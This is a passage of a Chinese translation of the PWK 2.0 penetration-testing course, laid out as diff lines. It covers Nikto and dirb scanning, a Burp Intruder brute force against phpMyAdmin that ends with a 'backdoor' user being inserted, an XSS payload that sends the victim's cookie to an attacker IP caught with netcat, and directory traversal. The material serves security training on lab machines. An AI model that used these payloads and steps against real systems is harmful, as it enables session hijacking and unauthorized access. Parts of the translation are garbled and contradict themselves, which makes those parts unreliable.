+- [248] (CIRT, 2019), https://cirt.net/Nikto
+ [249] (Wikipedia, 2019), https://en.wikipedia.org/wiki/User_agent
+- [250] (CIRT, 2019), https://cirt.net/nikto-docs/options.html#id291140
+
+`PWK 2.0` © Offensive Security Ltd. 保留所有权利。
+
+使用此功能来控制我们想要运行的测试类型。有时我们并不想运行 `Nikto` 内置的所有测试，例如验证是否存在某类漏洞。在这些情况下，使用扫描是无价的。
+
+`Nikto` 特别适用于捕捉易而得的成果、非标准服务器头以及捕捉服务器配置错误。
+
+为了演示这一点，让我们针对 `www.megacorpone.com` 运行 `Nikto`。我们将指定想要扫描的主机（`-host=http://www.megacorpone.com`），为了演示，我们将使用 `-maxtime=30` 来限制扫描时长：
+
+```
+```
+
+
+
+kalii~$ `nikto host=www.megacorpone.com -maxtime=30s`
+
+Nikto v2.1.6
+
+```
+
+| 目标 IP: | 38.100.193.76 |
+| 目标主机名: | www.megacorpone.com |
+| 目标端口: | 80 |
+
++   * Server: Apache/2.2.22 (Ubuntu)
++   * Server 可能通过 etags 泄露信息，位于 /index:15243, size:12519, time: Fri May 17 06:26:28 2019
++   * 缺少防点击 X-FrameOptions 头。
++   * 未定义 X-Protection 头。该头部可以提示用户代理防止 XSS 攻击。
++   * 未设置 X-Content-Type-Options 头。这允许代理以不同的 MIME 类型渲染网站内容。
++   * 未找到 CGI 目录（使用 -c 强制检查可能的目录）。
++   * "robots.txt" 包含 1 条目，应手动查看。
++   * Apache/2.2.22 似乎已过（当前至少是 Apache/2.4.37）。Apache 2.2.34 是 2.x 分支的终支持版本。
++   * ERROR: 达到 30 秒时间限制
++   * ERROR: 达到 30 秒时间限制
++   * 扫描终止：远程主机报告 0 个错误和 6 个项目。
++   * 结束时间：2019-06-05 11:22:35 (GMT-4) (30 秒)
+
++   + 测试了 1 个主机(s)
+
+> 图 283 - 针对 www.megacorpone.com 运行 nikto
+
+我们只是演示了 Kali Linux 中可用工具的一部分。
+
+PWK 2.0 © Offensive Security Ltd. 保留所有权利。
+
+### 9.4 利用 Web 漏洞
+
+现在我们已经涵盖了枚举并理解了如何使用一些基础工具，接下来我们将把注意力转向漏洞利用。在本节中，我们将讨论 Web 管理控制台，并关注特定的漏洞，如跨站脚本、目录遍历、文件包含、SQL 注入等。
+
+### 9.4.1 利用管理控制台
+
+让我们从管理控制台的枚举和利用开始。一旦定位到管理控制台，简单的“利用”方法就是登录它。我们可以尝试默认的用户名/密码对，使用枚举到的信息猜测有效的凭据，或尝试暴力破解。
+
+然而，在进行暴力破解时通常最好轻手一点。账户锁定会对我们的渗透测试产生负面影响，阻止合法管理员登录，并可能引起蓝队对我们的注意。一如既往，我们必须仔细权衡每个攻击向量的风险，并采取符合客户利益的谨慎行动。
+
+尽管存在这些风险，被攻破的管理控制台也是首要目标，它可能允许我们在服务器上部署并运行代码，从而提供快速获取 Shell 的路径。
+
+为了演示这一点，我们将通过一个针对安装在 Windows 10 目标机器上的配置不当的管理控制台的攻击示例。注意，本模块后续使用的 IP 地址可能与你的实验环境不匹配。请参考实验指南获取分配的 IP 地址。
+
+首先，我们将通过打开 XAMPP 控制面板并点击 Apache 和 MySQL 的 Start 来设置 Windows 10 目标。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_275_0.png)
+
+图 117：XAMPP 控制面板
+
+接下来，我们将从 Kali 运行 `dirb`，目标我们的 Windows 10 机器。
+
+```
+kali@kali:~$ dirb http://10.11.0.02 -r
+
+...
+
+URL_BASE: http://10.11.0.02/
+
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+OPTION: Not Recursive
+
+GENERATED WORDS: 4612
+
+-----------------
+
+Scanning URL: http://10.11.0.02/
+
+---------------------------------
+
++ http://10.11.0.02/lpt1 (CODE:403|SIZE:1047)
+
++ http://10.11.0.02/lpt2 (CODE:403|SIZE:1047)
+
++ http://10.11.0.02/nul (CODE:403|SIZE:1047)
+
+=> DIRECTORY: http://10.11.0.02/phpmyadmin/
+
++ http://10.11.0.02/prn (CODE:403|SIZE:1047)
+
++ http://10.11.0.02/robots.txt (CODE:280|SIZE:79)
+
+Running dirb on our Windows 10 lab machine
+```
+
+列表 284 - 在我们的 Windows 10 实验机器上运行 dirb
+
+输出列出了几个感兴趣的 URL，包括高亮引用的 `phpmyadmin`，这是一个 MySQL 数据库的管理工具，这特别值得关注。
+
+在我们的浏览器中输入相应的 URL 会产生一个 phpMyAdmin 登录页面：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_276_0.png)
+
+快速的搜索表明，phpMYAdmin 的默认登录凭据包括“root”和空密码。让我们在 Windows 10 目标上尝试一下。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_277_0.png)
+![](img/f99f528ca9845f4c256ce54e882b1345_277_1.png)
+
+图 119：phpMyAdmin 错误信息
+
+如果我们尝试这些凭据，我们会收到一条错误信息：“配置不允许无密码登录”。这是因为在 phpMyAdmin 配置文件 (`C:\xampp\phpMyAdmin\config.inc.php`) 中，"AllowNoPassword" 被设置为 False。在这种配置下，我们需要包含密码才能登录，这样我们才能合理假设密码不是空的。如果我们想获得访问权限，就必须尝试其他方法。
+
+### 9.4.1.2 Burp Suite Intruder
+
+由于默认凭据似乎不起作用，且不允许空密码，让我们尝试使用 Burp Suite 的 Intruder 工具来自动化一些基本的用户名和密码组合。请记住，此功能在 Burp 社区版中受到了限制。尽管如此，我们仍然可以使用它来解释一些重要的概念。
+
+[252] (PortSwigger, 2019), https://portswigger.net/burp/documentation/desktop/tools/intruder
+
+让我们从浏览器发送几次登录尝试，并在 Burp Suite 中查看响应。我们在截图中组合了三个请求：
+
+```
+POST /phpmyadmin/index.php HTTP/1.1
+
+Host: 10.11.0.1
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*q=0.8
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-form-urlencoded
+
+Content-Length: 118
+
+Cookie: phpmyadmin=6b02d1d6842b2636
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+
+set-cookie: PHPSESSID=6b02d1d6842b2636; path=/ HttpOnly; Secure
+
+POST /phpmyadmin/index.php HTTP/1.1
+
+Host: 10.11.0.1
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*q=0.8
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-form-urlencoded
+
+Content-Length: 138
+
+Cookie: phpmyadmin=4b9d81d4e84d6e5a106
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+```
+
+
+
+`set-cookie: PHPSESSID=4b9d81d4e84d6e5a106; path=/ HttpOnly; Secure`
+
+```
+POST /phpmyadmin/index.php HTTP/1.1
+Host: 10.11.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*q=0.8
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-form-urlencoded
+Content-Length: 158
+Cookie: phpmyadmin=k9w4rrmakv11m5fy800
+Connection: close
+Upgrade-Insecure-Requests: 1
+set-cookie: PHPSESSID=k9w4rrmakv11m5fy800; path=/ HttpOnly; Secure
+```
+
+图 120：PHP Admin 的登录请求
+
+根据输出，情况并不简单，因为我们有几个因素需要应对。从请求中可以看到，登录表单包含一个防止暴力破解和其他攻击的 `token`。此外，我们可以看到表单设置了一个 `set_session` 参数，每个请求都是唯一的。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_278_0.png)
+
+[253] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Cross-site_request_forgery#Synchronizer_token_pattern
+
+如果我们更改了 `set_session` 参数且它与 phpMyAdmin 的 `cookie` 值不匹配，网站将返回一个错误：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_279_0.png)
+
+图 121：Session 值不匹配的 phpMyAdmin 错误信息
+
+如果我们想成功登录，就需要避免这个错误。如果我们查看登录表单的 HTML 源代码，会发现新的 `set_session` 和 `token` 值包含在响应中：
+
+#### Response
+
+```
+<!-- Login form -->
+<form method="post" id="login_form" action="index.php" name="login_form"
+class="Ajax" id="js-show">
+  <legend><input type="hidden" name="set_session"
+value="uafe6b4dttirc3cb8bd50voke">/Log in <a href="/doc.html">index.html</a>a>a
+alt="Documentation"><input class="ic_b_help"/></legend>
+  <div class="item"
+value="">
+    <label for="input_username">Username:</label>
+    <input type="text" name="pma_username" id="input_username"
+value="" class="textfield"/>
+  </div>
+  <div class="item">
+    <label for="input_password">Password:</label>
+    <input type="password" name="pma_password" id="input_password"
+value="" class="textfield"/>
+  </div>
+  <input type="hidden" name="server" value="1">
+  <input type="hidden" name="go" value="index.php"
+  <input type="hidden" name="Token" value="D6ltqNfiJ:995:"/>
+  <fieldset><fieldset>
+    <input type="submit" value="Login" id="input_submit"
+name="submit" value="Login"
+    <input type="image" name="error" src="../themes/dot.gif"/>
+  </fieldset>
+</fieldset>
+  <div class="ic_s_error">Failed to set session cookie. Maybe
+you are using HTTP instead of HTTPS to access phpMyAdmin.</div></div></div>
+</form>
+<html><body></body>
+</html>
+```
+
+
+
+图 122：登录值变化（此处翻译）
+
+为了克服这种保护措施并确保值匹配，我们可以使用 Intruder 自动化请求。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+然而，我们必须首先提交一个登录请求供 Intruder 分析。我们可以通过导航到 `Proxy` -> `HTTP History`，右键点击 `/phpadmin/index.php` 的 `POST` 请求，然后发送到 Intruder。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_281_0.png)
+
+现在，当我们点击 Intruder 标签页时，我们发现它包含了多个请求子标签页。在此，我们将找到四个额外的子标签页：`Target`、`Positions`、`Payloads` 和 `Options`。让我们使用 Target 来检查这些内容。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_281_1.png)
+
+> 图 12：发送到 Intruder
+
+此标签页上的信息是根据我们发送的请求填充的，因此我们将保持值不变。
+
+> 图 12：Intruder 目标
+
+接下来，让我们查看 `Positions` 标签页的内容：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_282_0.png)
+
+图 12：Intruder 位置
+
+我们用它来标记 Burp Suite 在运行攻击时注入负载的字段。Burp Suite 会自动将 cookie 值和 POST 体值标记为负载位置，并使用节符号 `$` 作为分隔符。然而，
+
+我们将 `pma_username` 设置为 `"root"`，因为这是我们的目标用户账户。我们还有四个值需要修改，以便提交登录尝试。我们法通过选择该值并点击 `Add $`，将实际尝试的密码插入到 `pma_password` 中。phpMyAdmin 的 cookie 值和 `set_session` 的 POST 体值会在每次请求中发生变化，因此我们需要也把它们添加为负载位置。最后，token 值也会每次请求中发生变化以防止暴力破解，因此我们需要选择其值并点击 `Add $`。
+
+我们将攻击类型设置为“Pitchfork”，这允许我们为每个位置设置一个唯一的负载列表。为了考虑到我们想要发送的负载值的差异，这是必要的。音叉攻击将使用每个位置中对应列表的第一个值，然后下一个请求将使用每个列表中的第二个值，依此类推。Intruder 中还有其他攻击类型，但我们不会介绍它们。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_283_0.png)
+
+使用所需的负载配置“Pitchfork”攻击可能会有点困惑。在尝试操作之前，请务必通读本节。
+
+在使用这些负载之前，我们需要在 `Options` 标签页上配置一些负载，因此我们现在将跳过它们。Burp Suite 有“Recursive grep”负载，它使用 grep 在响应中搜索预定义的值，并将结果供下一次请求使用。这正是我们设置 phpMyAdmin cookie 值、`set_session` POST 值和 token 字段所需要的。
+
+图 16：设置负载位置
+
+让我们点击 `Options` 然后点击 `Add` 来配置我们的 Recursive Grep 负载。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_284_0.png)
+
+图 12：添加 Grep Extract
+
+这将打开一个新窗口，其中包含一个 HTTP 响应，我们可以它定义要提取的项目的位置。我们不想使用 `"Set-Cookie"` 头部来提取会话值，因为服务器设置了多个 phpMyAdmin cookie，而 Burp 将始终使用它找到的第一个实例。我们需要在 HTTP 响应窗口中向下滚动到登录表单内的 `set_session` 隐藏输入字段。
+
+我们将点击并选择输入字段的值。当我们这样做时，Burp 会自动设置 'Start after location' 和 'End at delimiter' 值，用以定义 grep 提取的分隔符，如下所示。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_285_0.png)
+
+我们将点击 `Ok` 保存提取，并通过从 `Intruder > 2 > Options` 中点击 `Add` 来定义另一个提取。
+
+这一次我们需要选择 token 字段的内容：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_286_0.png)
+
+图 12：定义 Grep Extract
+
+再次，我们点击 `OK` 保存第二个。现在我们已经定义了“Recursive grep”负载，我们需要通过点击 `Payloads` 标签页来设置我们的负载。我们将总共设置四个负载。对于我们顺序标记的每个位置都有一个负载集。换句话说，set 一 用于会话 cookie，set 二 用于会话字段，set 三 用于密码字段，set 四 用于 token 字段。
+
+负载一是 phpMyAdmin cookie 值。我们需要将类型选择为 `"Recursive grep"`，然后点击 `From` 作为我们的负载选项。
+
+图 13：设置负载值
+
+负载二是 `set_session` 值。它需要与 phpMyAdmin cookie 的值匹配，因此我们将使用与 set 一 相同的 `"Recursive grep"` 作为类型。
+
+负载三是密码值。我们将将其配置为使用“Simple list”负载类型。正如名称所示，这种负载类型使用简单的字符串列表。我们可以通过点击手动在列表中添加值。我们将重复此操作以输入几个密码。
+
+图 14：输入负载
+
+最后，负载四是 token 值。我们将再次使用 `"Recursive grep"` 负载类型，并将 `<input type="hidden" value="">` 作为我们的负载选项。
+
+我们已经进行了许多设置，在启动攻击之前让我们回顾一下我们做了什么。
+
+我们在 phpMyAdmin cookie 值以及 `set_session`、`pma_password` 和 token 参数的 POST 体值上标记了四个位置：
+
+图 13：Intruder 设置
+
+我们的前两个负载是“Recursive”，带有会话提取负载。我们的第四个负载也是“Recursive grep”，带有 token 提取负载。
+
+图 14：所有负载就绪
+
+一旦验证了这些设置，我们将点击 `Start` 按钮。这将显示以下消息：
+
+# SECURITY
+使用 Kali Linux 2.0 进行渗透测试
+
+# Burp Intruder
+
+> Burp Suite 社区版包含 Burp Intruder 的演示版本。某些功能被禁用，且攻击受到时间限制。请访问 https://portswigger.net 了解有关 Burp Suite 专业版的更多详细信息。
+
+图 15：Burp Intruder 局限性
+
+Intruder 的演示版本可以正常工作，因此我们将点击 `Ok` 开始攻击，并发送每个标记位置替换为相应负载值的请求。Burp Suite 将打开一个包含结果的新窗口：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_291_0.png)
+
+图 16：返回攻击结果
+
+如果配置正确，其中一个请求将触发 302 响应，这与其他 200 响应脱颖而出。此条目还包含一个 cookie，似乎表示登录成功。根据输出，Burp Suite 能够使用 `"root"` 密码登录。我们可以通过我们的方法来验证这一点：
+
+# 攻击性安全
+www.offensive-security.com
+
+基于 Kali Linux 的渗透测试 2.0
+
+这个例子看起来可能有些反常，但在现实世界中，弱或可预测的密码仍然非常常见，并且在更复杂的示例中一定有效。
+
+图 137：phpMyAdmin 控制台
+
+PWK 2.0
+版权 © Offensive Security Ltd. 保留所有权利。
+292
+
+# 基于 Kali Linux 的渗透测试 2.0
+
+我们可以利用对 phpMyAdmin 的访问权限直接对数据库执行任意 SQL 查询。如果我们点击“SQL”，我们就可以编写自己的 SQL 查询语句。我们将在本模块的后半部分更深入地介绍 SQL，但现在，我们将输入 `select from webappdb.users;` 作为我们的查询，以检索 webappdb 数据库中 users 表中的所有数据。
+
+图 138：通过 phpMyAdmin 执行查询
+
+点击“Go”后，我们得到了查询结果，包括明文密码。
+
+我们不仅可以查询数据库并查看表内容，还可以向数据库中插入数据。
+
+# 攻击性安全
+www.offensive-security.com
+
+让我们通过点击“Show query box”并输入 `insert into webappdb.users(password,username) VALUES ("backdoor","backdoor")` 来创建一个新用户。此查询将添加一个名为“backdoor”且密码为“backdoor”的新用户。
+
+接下来，我们点击“Go”进入页面。页面将更新并显示“1 row inserted”。
+
+图 14：插入一个新的管理员用户
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。296
+
+# 攻击性安全
+
+基于 Kali Linux 的渗透测试 2.0
+
+我们可以通过点击“Show query box”，输入 `select * from webappdb.users` 然后点击“Go”来验证该用户。这应该返回三条记录：
+
+图 142：验证我们的用户已添加
+
+这是我们使用 PhpMyAdmin 和 SQL 查询可以完成的简短示例。我们将在模块稍后讨论，届时我们将演示 SQL 注入并利用 SQL 访问权限获取服务器的 shell。
+
+### 9.4.1.3 练习
+
+- 1. 使用 Burp Intruder 访问运行在你的 Windows 10 实验机器上的 phpMyAdmin 站点。
+- 2. 在“users”表中插入新用户。
+
+### 9.4.2 跨站脚本 (XSS)
+
+定义良好的 Web应用程序最重要的功能之一是数据清洗，这是一个对用户输入进行处理的过程，删除或转换所有危险的字符或字符串。未经过清洗的数据允许攻击者注入并可能执行恶意代码。当
+
+> ²256 (维基百科, 2019), https://en.wikipedia.org/wiki/Data_validation
+
+这种未清洗的输入在网页上显示时，就会产生跨站脚本（XSS）漏洞。XSS 曾被认为是一种相对低风险的漏洞，但今天既是高风险又是普遍的，允许攻击者向其他用户查看的网页中注入客户端脚本（如 JavaScript）。
+
+有三种跨站脚本变体：存储型、反射型 和 基于 DOM 型。
+
+存储型 XSS 攻击（也称为持久型 XSS）发生在利用程序存储在数据库中或被服务器缓存时。Web 应用程序检索此负载并显示给任何查看漏洞页面的用户。因此，一个存储型 XSS 漏洞就可以攻击该网站的所有用户。存储型 XSS 漏洞通常存在论坛软件中，特别是评论区或产品评论中。
+
+反射型 XSS 攻击通常在请求的查询或链接中包含负载。Web 应用程序获取此值并将其放入页面内容。当提交请求或查看链接的人发现搜索结果和页面，以及用户输入包含在错误消息中时，就会发生反射型 XSS 漏洞。
+
+基于 DOM 的 XSS 攻击与其他类型类似，但发生在页面文档对象模型（DOM）内部。这种变体发生在页面 DOM 被用户控制的值修改时。基于 DOM 的 XSS 可以是存储或反射的。无论 XSS 如何传递，浏览器都会执行脚本。在接后的章节中，我们将探讨一些。
+
+# 攻击性安全 基于 Kali Linux 的渗透测试 2.0
+
+### 9.4.2.1 识别 XSS 漏洞
+
+我们可以通过检查字段发现潜在的 XSS 入点。如果应用程序没有移除或编码这些字符，就可能受到攻击。
+
+> ²257 (维基百科, 2019), https://en.wikipedia.org/wiki/Cross_scripting
+> ²258 (维基百科, 2019), https://en.wikipedia.org/wiki/Cross_scripting#Persistent_or
+> ²259 (维基百科, 2019), https://en.wikipedia.org/wiki/Cross_scripting#Reflected
+> ²260 (维基百科, 2019), https://en.wikipedia.org/wiki/Cross_scripting#DOM-based
+> ²261 (维基百科, 2019), https://en.wikipedia.org/wiki/Document_Object_Model
+
+PWK 2.0 | © Offensive Security Ltd. 保留所有权利。298
+
+# 攻击性安全 基于 Kali Linux 的渗透测试 2.0
+
+### 9.4.2.2 基础 XSS
+
+让我们通过针对 Windows 10 机器的简单攻击演示基础 XSS。
+
+回到 Windows 10 机器 80 端口的 Web 应用程序，我们将从启动 Apache 和 MySQL（如之前那样）并浏览网页开始：
+
+> ²262 (维基百科, 2019), https://en.wikipedia.org/wiki/HTML_element
+> ²263 (维基百科, 2019), https://en.wikipedia.org/wiki/Character_encodings_in_HTML#character_references
+> ²264 (维基百科, 2019), https://en.wikipedia.org/wiki/Percent-encoding
+> ²265 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script
+
+用于此目的的最常见特殊字符包括：
+
+
+
+< > ' " { } ;
+
+```
+列表 85 - HTML 和 JavaScript 的特殊字符
+```
+
+让我们描述这些字符的作用。HTML 使用 `"<"` 来表示 HTML 文档的各个组件。JavaScript 使用 `"("` 和 `")"` 用于函数声明。单引号 `(')` 和双引号 `(")` 用于表示字符串，分号 `(;)` 用于标记语句的结束。
+
+如果我们将这些特殊字符注入页面中，浏览器会将它们视为代码。
+
+# 攻击性安全
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_299_0.png)
+
+# 欢迎来到 Tom 的塔可餐车
+
+我们的食物建立在一个简单的信念之上：我们用最好的食材制作最棒的塔可。为什么不尝试一下呢？很快就会在您附近上线！
+
+图 143：塔可。美味的塔可。
+
+该应用程序包含多个漏洞，包括一个存储型 XSS 漏洞。为了演示这一点，我们可以在反馈表单字段中插入一些特殊字符并提交它们。我们将从提交一些 JavaScript 特有的字符开始：双引号（`" '`)、分号（`;`）、`<script>`
+
+![](img/f99f528ca9845f4c256ce54e882b1345_299_1.png)
+
+## 我们喜欢听取客户的反馈！看看他们对我们的评价。
+
+| Jake | 今天的塔可太棒了！ |
+| --- | --- |
+| John | 如果可以的话，我每天都吃塔可！ |
+
+为什么不留下一你自己的评论呢？
+姓名：
+
+| test |
+| --- |
+| 评论: |
+| hello*; <> |
+
+提交
+
+图 144：进行 XSS 测试
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_300_0.png)
+
+通过检查器工具（Inspector tool）查看消息，我们可以看到我们的字符被移除或编码了：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_300_1.png)
+
+# 我们喜欢听取客户的反馈！看看他们对我们的评价。
+
+由于输入没有经过过滤或清理，我们的特殊字符通过了输出，这导致了 XSS 漏洞。让我们检查源代码来理解发生了什么。
+
+当反馈被提交到网站时，它将由以下代码处理：
+
+```php
+<?php
+include "database.php";
+$sql = "INSERT INTO feedback(name, text) VALUES (?,)";
+$stmt = $conn->prepare($sql);
+$stmt->bind_param("ss", $_POST['name'], $_POST['comment']);
+$stmt->execute();
+?>
+```
+
+列表 286 中的第 40 行处理提交到服务器的 `"name"` 和 `"comment"` 字段的值。代码在不进行任何修改的情况下将这些值插入数据库。
+
+PWK 2.0 Copyright © Offensive Security Ltd. 保留所有权利 301
+
+# 攻击性安全
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+接下来，我们将检查在网站上显示反馈的代码：
+
+```php
+<?php
+    include "database.php";
+    $sql = "SELECT name, text FROM feedback";
+    $result = $conn->query($sql);
+    if ($result->num_rows > 0) {
+        while($row = $result->fetch_assoc()) {
+            echo "td>" . $row["name"] . "</td><td>" . $row["text"] . "</td>";
+        }
+    } else { echo "No results;";
+    }
+?>
+```
+
+列表 287 - `feedback.php` 的代码片段
+
+287 中的第 44 行将来自数据库的结果写入页面。结果确实在没有经过任何修改的情况下被输出了。
+
+数据应该在哪里进行清理？是在提交时还是在显示时？理想情况下，在两个位置都对数据进行清理是“深度防御”（Defense in Depth）266 的示例——这种安全实践和原则主张在任何地方添加防御层以创建更健壮的应用程序。然而，如果清理只应用一处，则应该保持一致。在 PHP 中，可以使用 `htmlspecialchars` 函数在显示字符串之前将关键字符转换为 HTML 实体。在我们查看的任一 PHP 文件中使用此函数将有助于防止此 XSS 漏洞。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_301_0.png)
+
+266 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Defense_in_depth.,(computing)
+267 (The PHP Group, 2019), https://php.net/manual/en/function.htmlspecialchars.php
+
+PWK 2.0
+Copyright © Offensive Security Ltd. 保留所有权利。
+302
+
+# 攻击性安全
+
+让我们更新输入并创建一个显示简单 JavaScript 警告的有效负载（payload）。根据我们查看的代码，我们可以看到消息正在被插入到 HTML 表格单元中。我们在这里不需要任何花哨的编码技巧，只需要基础的 XSS 负载，例如 `<script>alert('XSS')</script>`。让我们现在插入。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_302_0.png)
+
+我们喜欢听取客户的反馈！看看他们对我们的评价。
+
+图 143：进行 XSS 测试
+
+303
+
+# 攻击性安全
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_303_0.png)
+
+我们喜欢听取客户的反馈！看看他们对我们的评价。
+
+图 144：进行 XSS 测试
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+已通过验证。如果我们修改有效负载（payload），就可以捕获害者的 `PHPSESSID` cookie 以获取其认证会话的访问权限。
+
+我们使用 Javascript 读取 cookie 并将其附加到链接回我们攻击机器的图像 URL 中。浏览器将读取该图像并向我们的攻击系统发送 GET 请求，并将 cookie 作为 URL 查询字符串的一部分发送。
+
+为了实现我们的有效负载，我们需要如下修改我们的 XSS 有效负载：
+
+```
+<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+```
+
+列表 290 - 用于窃取 cookie 的 XSS 有效负载
+
+一旦我们将此有效负载提交到应用程序中，只需要等待已身份验证的用户访问该页面，我们就可以捕获 `PHPSESSID` cookie。我们可以从 Windows 10 实验机上手动进行操作，或者在 Windows 10 实验机上使用 PowerShell 脚本（`Documents/admin_login.ps1`）来模拟管理员登录：
+
+```powershell
+$username="admin"
+$password="psssword"
+$url_login="127.0.0.1/login.php"
+$ie = New-Object -com InternetExplorer.Application
+$ie.Visible = $true
+$ie.navigate("$url_login")
+while($ie.ReadyState -ne 4){start-sleep -m 1000}
+$ie.document.GetElementsByName("username")[0].value="$username"
+$start-sleep -m 10
+$ie.document.GetElementsByName("password")[0].value="$password"
+start-sleep -m 10
+$ie.document.GetElementsByClassName("btn")[0].click()
+start-sleep -m 100
+$ie.Quit()
+[System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)
+```
+
+
+
+列表 291 - `admin_login.ps1`
+
+此脚本创建一个 Internet Explorer 实例，导航到登录页面，登录，然后退出。这就是触发我们的 XSS 有效负载。使用 `-ExecutionPolicy Bypass` 允许运行未签名脚本，并使用 `-File admin_login.ps1` 指定要执行的脚本：
+
+```bash
+C:\Users\admin\Documents> powershell -ExecutionPolicy Bypass -File admin_login.ps1
+```
+
+列表 292 - 运行 PS 脚本
+
+当受害者查看已认证页面时，他们将使用认证会话 ID 与我们建立连接：
+
+```bash
+kali@kali~$ sudo nc -nvlp 80
+
+listening (on 80) ... ...
+
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 53824
+
+GET /cool.jpg?output=PHPSESSID=a19ys5mdp8di11liac9m2fi76 HTTP/1.1
+
+Referer: http://127.0.0.1/admin.php
+
+User-Agent: Mozilla/5.0 (Linux; x86_64; rv:60) Gecko/201010101 Firefox/60.0
+
+...
+```
+
+列表 293 - 使用 Netcat 接收 cookie
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 版权所有。
+
+现在我们有了认证会话 ID，需要将其设置在浏览器中。我们可以使用 Cookie-Editor273 浏览器扩展程序来方便地设置和操作 cookie。
+
+我们可以在 Firefox 访问 https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/ 并点击 Add to Firefox 来安装此扩展程序。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_306_0.png)
+
+图 148: Firefox 扩展管理器
+
+我们将点击 *Add* 以接受权限对话框并安装扩展程序。现在，在 Firefox 工具栏的 FoxyProxy 图标旁边应该有一个新的 cookie 图标。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_307_0.png)
+
+安装好 Cookie-Editor 后，返回 Web 应用程序并点击 Cookie-Editor 图标打开其对话窗口。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_307_1.png)
+
+欢迎来到 Tom's Taco Truck
+我们的食品餐车建立在一个简单的信念之上：我们很快就会出现在您附近！
+此页面没有任何 cookie
+
+接下来，我们将点击 *Add* 按钮，粘贴窃取的 cookie 值，并点击 *Add* 保存新的 cookie：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_308_0.png)
+
+一旦添加了 cookie 值，我们就可以在提供任何凭据的情况下访问 `/admin.php` 管理界面。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_308_1.png)
+
+注意，我们没有被重定向到登录页面，并且对反馈项有“Delete”链接。这表明我们成功劫持了用户的会话。注意，这种攻击是针对会话的。一旦窃取会话，我们可以伪装成受害者，直到他们注销或会话过期。
+
+### 9.4.2.5 练习
+- 在同一应用程序中利用 XSS 漏洞获取 cookie 并劫持会话。记住在你的 Windows 10 实验机上使用 PowerShell 脚本来模拟管理员登录。
+- 考虑此应用程序中的 XSS 漏洞可能用于哪些其他攻击。
+- 此漏洞利用的是服务器还是客户端？
+
+### 9.4.2.6 其他 XSS 攻击
+之前的章节说明了一些基本的 XSS 利用示例。如果 Web 端在显示之前未能过滤任何输入，我们就可以完全利用 JavaScript 的功能，仅限于我们能注入代码的长度。即使有效负载有限，也可能使用 XSS 注入指向外部文件的链接。XSS 的影响不仅限于窃取 cookie。我们已经提到了重定向和客户端攻击。其他 XSS 还包括击键记录器、钓鱼攻击、扫描以及 BeEF（浏览器漏洞利用框架），它可以利用一个简单的 XSS 漏洞启动许多不同的客户端攻击。
+
+### 9.4.3 目录遍历
+目录遍历漏洞（也称为路径遍历）发生在应用程序对输入未进行良好验证时，允许攻击者访问应用程序根目录之外的文件。这种漏洞出现在某些特定编程语言编写的服务器中，允许攻击者通过 `../` 访问敏感信息。虽然这些攻击可以暴露信息，但不会执行代码。我们将首先讨论目录遍历，然后在稍后的章节讨论文件包含。
+
+#### 9.4.3.1 识别和利用目录遍历
+目录遍历的搜索始于对 URL 查询字符串和表单体中文件引用的检查。参数值中的文件扩展名通常是应该调查的迹象，因为它表明从不同的资源加载文本或代码。一旦我们确定了一些可能的候选，就可以修改这些值以代表可读取的文件，例如 Linux 上的 `/etc/passwd` 或 Windows 上的 `boot.ini`。让我们回到 Windows 10 上的示例应用程序演示这种漏洞。
+
+> (Wikipedia, 2019), https://en.wikipedia.org/wiki/Directory_traversal
+
+![](img/f99f528ca9845f4c256ce54e882b1345_310_0.png)
+
